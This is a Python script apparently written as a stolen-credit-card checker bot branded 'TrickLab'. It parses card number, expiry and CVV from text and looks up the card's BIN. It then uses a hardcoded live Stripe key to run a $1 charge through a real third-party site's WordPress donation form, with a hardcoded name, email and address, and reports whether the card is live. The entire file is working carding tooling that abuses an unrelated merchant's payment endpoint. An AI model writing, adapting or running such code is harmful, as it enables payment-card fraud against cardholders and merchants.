# s1.py
import aiohttp
import asyncio
import re
import time

async def stripe_1d(text):
    start_time = time.time()
    print("Doing")
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})' 
    match = re.search(pattern, text)

    if match:
        card_number = match.group(1)
        month = match.group(2)
        year = match.group(3)
        cvv = match.group(4)

        if len(year) == 2:
            year = "20" + year
        n = card_number
        cvc = cvv
        mm = month
        yy = year
        full_card = f"{n}|{mm}|{yy}|{cvc}"
        url = f'https://bins.antipublic.cc/bins/{n}'

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as bin_response:
                z = await bin_response.json()
                bin = z['bin']
                bank = z['bank']
                brand = z['brand']
                card_type = z['type']
                level = z['level']
                country = z['country_name']
                flag = z['country_flag']
                currency = z['country_currencies'][0]
      
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': 'N/A',
            'muid': 'N/A', 
            'sid': 'N/A',   
            'payment_user_agent': 'stripe.js/v3',
            'key': 'pk_live_51JIGi9Fh7Zzb7IxvKHDKPfhqQpsyEcGAN4xRSjSN1MLCdQy91izooxlLjxQQJphHmhCMI3lFLY0Lvig6JCDSJ5G000ytPlehTg',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as stripe_response:
                    stripe_json = await stripe_response.json()  
                    payment_method_id = stripe_json.get('id')

                    if payment_method_id:
                        pass  
                    else:
                        return "Failed to retrieve Payment Method ID from Stripe. Please check the card details."
        except Exception as e:
            return f"Error processing Stripe request: {str(e)}"
                 
        headers = {
            'authority': 'loveaprisoner.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://loveaprisoner.com',
            'referer': 'https://loveaprisoner.com/payment/',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1758153674383',
        }

        data = {
            'data': f'__fluent_form_embded_post_id=14305&_fluentform_13_fluentformnonce=c1683fde68&_wp_http_referer=%2Fpayment%2F&names%5Bfirst_name%5D=Sai&names%5Blast_name%5D=Lurn&email=saiwonelurn7%40gmail.com&address_1%5Baddress_line_1%5D=127%20Allen%20St&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_text=0&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={payment_method_id}',
            'action': 'fluentform_submit',
            'form_id': '13',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://loveaprisoner.com/wp-admin/admin-ajax.php', params=params, headers=headers, data=data) as response:
                    r0 = await response.text()

                    # Calculate elapsed time
                    elapsed_time = time.time() - start_time

                    if "Thank" in r0:
                        return f"""        	
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱
                        
𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Charge Successful

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ TrickLab
                        """
                    elif "Authentication" in r0:
                        return f"""
                        
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱    
    
𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Authentication Failed

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ TrickLab
                        """
                    
                    else:
                        try:
                            response_json = await response.json()
                            response0 = response_json.get('errors', 'ERROR')
                        except:
                            response0 = 'ERROR'
                        return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
{response0}

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ TrickLab
                        """
        except Exception as e:
            return f"Error processing final request: {str(e)}"
    else:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."
